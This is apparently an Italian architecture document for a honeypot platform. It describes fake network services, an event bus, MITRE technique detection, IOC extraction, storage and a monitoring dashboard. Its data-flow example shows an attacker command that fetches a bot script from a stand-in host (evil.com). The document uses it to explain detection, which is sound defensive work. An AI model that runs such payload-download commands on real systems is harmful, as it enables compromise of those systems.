# Architettura

## Architettura ad Alto Livello

```
                    ┌─────────────────────────────────────────────┐
    Attackers       │              Hive Backend                   │
                    │                                             │
  ┌──────┐         │  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐   │
  │ SSH  │────2222──│──│ sshd │  │ httpd│  │ ftpd │  │ smbd │   │
  │Client│         │  └──┬───┘  └──┬───┘  └──┬───┘  └──┬───┘   │
  └──────┘         │     │         │         │         │        │
  ┌──────┐         │  ┌──┴───┐  ┌──┴───┐                        │
  │MySQL │────3307──│──│mysqld│  │redisd│                        │
  │Client│         │  └──┬───┘  └──┬───┘                        │
  └──────┘         │     │         │                             │
                   │     ▼         ▼                             │
                   │  ┌─────────────────┐                        │
                   │  │    Event Bus    │  (fan-out pub/sub)      │
                   │  │  topic: all     │                        │
                   │  └────────┬────────┘                        │
                   │           │                                 │
                   │     ┌─────┴─────┐                           │
                   │     │ Processor │  (4 worker goroutines)    │
                   │     │ ┌───────┐ │                           │
                   │     │ │GeoIP  │ │  enrich with location     │
                   │     │ │MITRE  │ │  detect techniques        │
                   │     │ │Store  │ │  persist to PostgreSQL    │
                   │     │ │Stream │ │  publish to Redis stream  │
                   │     │ └───────┘ │                           │
                   │     └───────────┘                           │
                   │                                             │
                   │  ┌─────────────────┐                        │
                   │  │   REST API      │  Chi router :8000      │
                   │  │   WebSocket     │  /ws/events             │
                   │  └─────────────────┘                        │
                   └──────────────┬──────────────────────────────┘
                                  │
                   ┌──────────────┴──────────────────┐
                   │         Frontend                │
                   │   React 19 + TypeScript         │
                   │   ┌────────────────────┐        │
                   │   │ Dashboard          │        │
                   │   │ Event Table        │        │
                   │   │ Session Replay     │        │
                   │   │ MITRE Heatmap      │        │
                   │   │ Intel Export       │        │
                   │   └────────────────────┘        │
                   └─────────────────────────────────┘
```

## Suddivisione dei Componenti

### Servizi Honeypot (`internal/sshd/`, `httpd/`, ecc.)

Ciascun servizio implementa l'interfaccia `types.Service` con due metodi: `Name()` e `Start(ctx)`. I servizi accettano connessioni sulla porta configurata, gestiscono una porzione di protocollo sufficiente a sostenere l'interazione e pubblicano gli eventi sull'event bus. Nessuno di essi interagisce direttamente con il database.

Il servizio SSH è il più complesso, dotato di un filesystem in-memory, oltre 25 comandi fittizi, registrazione della sessione in formato asciicast e banner MOTD che imitano server Ubuntu reali. Il servizio SMB è il più semplice: legge un frame NetBIOS, invia una risposta di negoziazione e chiude la connessione.

### Event Bus (`internal/event/bus.go`)

Il bus rappresenta il sistema nervoso centrale. Ciascun servizio pubblica eventi su topic dedicati (auth, command, connect, scan, exploit). I subscriber ricevono gli eventi tramite channel con buffer. La pubblicazione è non bloccante: se il channel di un subscriber è pieno, l'evento viene scartato anziché generare back-pressure sul producer.

Questo design fa sì che un client WebSocket lento o un'operazione di scrittura su database congestionata non possano mai rallentare i servizi honeypot stessi. Gli aggressori ottengono sempre un'esperienza fluida e reattiva, il che li incentiva a proseguire l'interazione più a lungo e consente di raccogliere maggiori informazioni di intelligence.

### Event Processor (`internal/event/processor.go`)

Un pool di goroutine worker preleva gli eventi dal bus e li elabora attraverso una pipeline di arricchimento:

1. Lookup GeoIP: associa paese, città, ASN e coordinate all'IP sorgente di ogni evento
2. Rilevatore di tecniche MITRE: valuta sia regole basate su eventi singoli (pattern di comandi) sia finestre temporali scorrevoli su più eventi (sliding window per il rilevamento di brute force), restituendo oggetti `MITREDetection` completi di tattica, confidenza ed evidenze già valorizzati
3. Store PostgreSQL: persiste cinque elementi per ciascun evento: l'evento stesso, una riga in `mitre_detections` per ciascuna tecnica rilevata, una riga in `credentials` per gli eventi di autenticazione (username, password e metodo di autenticazione estratti da `ServiceData`), un'operazione di upsert su `attackers` (incrementando il conteggio degli eventi e aggiornando il timestamp dell'ultimo avvistamento e i dati geografici) e un'operazione di upsert su `iocs` per l'IP sorgente
4. Streamer Redis: pubblica su uno stream per i consumatori real-time

### Layer di Storage (`internal/store/`)

PostgreSQL memorizza tutti i dati persistenti: eventi, sessioni, aggressori, credenziali, IOC e rilevamenti MITRE. Lo schema impiega il partizionamento a intervalli mensili (monthly range partitioning) sulle tabelle di eventi e sessioni per velocizzare le query su intervalli temporali. Gli indici GIN sui campi JSONB e sugli array di tag garantiscono un filtraggio rapido.

Redis funge da layer di streaming real-time. Gli eventi vengono pubblicati su uno stream Redis (XADD) con una lunghezza massima configurabile. I consumatori esterni possono leggere da questo stream in modo indipendente rispetto alla dashboard.

### Layer di Intelligence (`internal/intel/`, `internal/mitre/`)

Il rilevatore MITRE mantiene lo stato per ciascun IP al fine di identificare pattern multi-evento. Traccia i tentativi di autenticazione all'interno di una finestra scorrevole (5 tentativi in 5 minuti attivano il rilevamento di brute force) e le connessioni ai servizi (3 servizi differenti in 60 secondi attivano il rilevamento di scansione dei servizi).

L'estrattore di IOC ricava indirizzi IP, URL, domini e stringhe user-agent dai dati degli eventi. Gli IOC estratti vengono deduplicati per tipologia e valore, con punteggi di confidenza basati sul contesto di osservazione (i tentativi di exploit ricevono il 95%, le connessioni passive il 50%).

### API della Dashboard (`internal/api/`)

Un server HTTP basato su Chi espone endpoint REST per il frontend e un endpoint WebSocket per lo streaming in tempo reale. L'handler WebSocket si sottoscrive all'event bus e inoltra gli eventi come frame JSON. Gli endpoint REST interrogano PostgreSQL attraverso l'interfaccia di store.

## Flusso dei Dati

Il flusso completo dei dati dall'azione dell'aggressore alla visualizzazione sulla dashboard:

```
1. L'aggressore esegue `wget http://evil.com/bot.sh` nella shell SSH

2. sshd/commands.go instrada la richiesta a handleWget()
   - Restituisce all'aggressore un finto output "Connecting..."
   - Pubblica Event{EventType: EventCommand, ServiceData: {"command": "wget ..."}}
   - Registra i byte di output sul registratore asciicast

3. L'Event Bus esegue il fan-out verso tutti i subscriber
   - Il worker pool del Processor prende in carico l'evento
   - I client WebSocket lo ricevono immediatamente

4. Pipeline del Processor:
   a. GeoIP: risolve l'IP sorgente in paese/città/ASN
   b. Rilevatore MITRE: "wget" corrisponde a isToolTransfer() -> T1105 (Ingress Tool Transfer), tattica "command-and-control", restituito come oggetto MITREDetection completo
   c. Store: INSERT events; INSERT mitre_detections (riga T1105); UPSERT attackers (incrementa il conteggio eventi); UPSERT iocs (IP sorgente come IOCIPv4)
   d. Redis: XADD sullo stream honeypot:events

5. Il WebSocket invia l'evento JSON ai client dashboard connessi
   - Il frontend React riceve i dati tramite lo store WebSocket zustand
   - L'evento compare nel componente feed live
   - Le statistiche si aggiornano automaticamente tramite polling con TanStack Query
```

## Pattern di Progettazione

### Pub/Sub Fan-out

L'event bus utilizza il modello fan-out: ogni evento pubblicato viene inviato a ciascun subscriber il cui filtro per topic corrisponda. Si tratta di una scelta intenzionalmente semplice. Non vi è alcun acknowledgment dei messaggi, nessun replay e nessuna persistenza all'interno del bus stesso. Il bus funge da meccanismo di coordinamento, non da coda di messaggi.

Trade-off: perdita di eventi sotto carico elevato. Se il buffer di un subscriber si satura, gli eventi vengono scartati silenziosamente. Nel caso di un honeypot questo comportamento è accettabile, poiché i servizi honeypot costituiscono la fonte di verità (possiedono l'intero contesto) e il processor rappresenta il layer di persistenza. Il bus si limita a collegarli.

### Dependency Injection Basata su Interfacce

Il processor dipende da interfacce (`GeoResolver`, `TechniqueDetector`, `DataStore`, `EventStreamer`), non da tipi concreti. `DataStore` è più ampia di un'interfaccia a metodo singolo: comprende `InsertEvent`, `InsertCredential`, `InsertDetection`, `UpsertAttacker` e `UpsertIOC`. Ciascun componente può essere testato in isolamento tramite implementazioni mock, e ogni interfaccia è definita nel package fruitore (`event/processor.go`), facendo sì che la freccia delle dipendenze punti verso l'interno: i tipi concreti dello store in `internal/store/` soddisfano l'interfaccia senza dover importare il package event.

### Pattern Service Interface

Tutti e sei gli honeypot e il server API implementano la medesima interfaccia a due metodi. Il comando serve li istanzia in modo condizionale in base ai flag di configurazione e li esegue tutti all'interno di un errgroup. L'aggiunta di un nuovo honeypot richiede semplicemente l'implementazione di `Name()` e `Start(ctx)` e la relativa registrazione in serve.go.

## Modelli di Dati

### Event (il tipo principale)

Ogni interazione produce un Event. Esso contiene un tipo di servizio, un tipo di evento, l'IP sorgente, il session ID e un campo `ServiceData` (JSON) per i dati specifici del protocollo. Comandi SSH, header HTTP, percorsi FTP e query MySQL confluiscono tutti in ServiceData.

### Session

Raggruppa gli eventi generati da una singola connessione di un aggressore. Traccia orari di inizio/fine, conteggio dei comandi, stato del login, tecniche MITRE rilevate e un punteggio di minaccia (threat score). Le sessioni SSH possono durare diversi minuti e produrre decine di eventi. Le "sessioni" HTTP consistono in un singolo evento per ogni richiesta.

### Attacker

Aggrega i dati relativi a tutte le sessioni provenienti da un unico IP. Registra i timestamp del primo e dell'ultimo avvistamento, il totale degli eventi, le informazioni geografiche e la famiglia di strumenti rilevata (hydra, nmap, metasploit, ecc.).

## Decisioni di Progettazione

**Implementazioni proprietarie dei protocolli a livello wire rispetto a librerie esterne**: MySQL e FTP utilizzano handler del protocollo wire scritti manualmente anziché librerie come go-mysql o goftp. Questo approccio garantisce il pieno controllo sui dati catturati ed evita l'accoppiamento con API di libreria soggette a modifiche. Inoltre, rende il codice maggiormente istruttivo, poiché mostra con precisione quali byte transitano sulla rete.

**Autenticazione permissiva (Accept-all)**: Ciascun servizio honeypot accetta qualsiasi credenziale. L'alternativa, ovvero l'accettazione selettiva, comporterebbe la cattura di un numero inferiore di coppie di credenziali e potrebbe scoraggiare gli aggressori dal proseguire. Il progetto Cowrie è passato dall'accettazione selettiva a quella totale riscontrando un incremento pari a 3 volte nella raccolta di dati post-autenticazione.

**Partizionamento mensile senza TimescaleDB**: Il normale partizionamento a intervalli di PostgreSQL consente di mantenere semplice la configurazione Docker (usando l'immagine standard postgres:17-alpine). TimescaleDB offrirebbe una migliore gestione automatica delle partizioni e aggregati continui, ma richiederebbe un'immagine Docker personalizzata.

**SMB con sola negoziazione (negotiate-only)**: Un'implementazione completa di SMB2 richiederebbe oltre 15 tipi di messaggi tra setup della sessione, tree connect, create, read, write e close. La sola fase di negoziazione è sufficiente a catturare le attività di scansione (il segnale primario derivante dagli honeypot SMB) e a identificare gli strumenti impiegati tramite la negoziazione del dialetto.

## Architettura di Deployment

```
┌─────────────────────────────────────────────────┐
│  Docker Compose                                  │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │PostgreSQL│  │  Redis   │  │   Backend    │  │
│  │  :5432   │  │  :6379   │  │ :2222 (SSH)  │  │
│  │          │  │ (infra)  │  │ :8080 (HTTP) │  │
│  └──────────┘  └──────────┘  │ :2121 (FTP)  │  │
│                               │ :4450 (SMB)  │  │
│  ┌──────────────────────┐    │ :3307 (MySQL)│  │
│  │     Frontend         │    │ :6380 (Redis)│  │
│  │  nginx + React SPA   │    │ :8000 (API)  │  │
│  │       :3000          │    └──────────────┘  │
│  └──────────────────────┘                       │
└─────────────────────────────────────────────────┘
```

Il Redis per l'infrastruttura sulla porta 6379 (esclusivamente interno) gestisce lo streaming degli eventi e il caching. Il Redis honeypot sulla porta 6380 (esposto) è il servizio redisd a cui si connettono gli aggressori. Si tratta di ambiti completamente separati.

## Limitazioni

- Nessuna terminazione TLS per i servizi honeypot (gli aggressori che si connettono via HTTPS vedono un server HTTP in chiaro)
- Nessun deployment distribuito (architettura a sensore singolo, nessuna coordinazione multi-nodo)
- SMB cattura i metadati di connessione ma nessun dato sulle operazioni sui file
- Nessuna analisi del malware (i file catturati vengono memorizzati ma non eseguiti in sandbox/detonati o scansionati)
- I subscriber WebSocket si accumulano senza cleanup alla disconnessione dei client (accettabile per l'uso della dashboard, ma richiederebbe una correzione per un deployment in produzione)
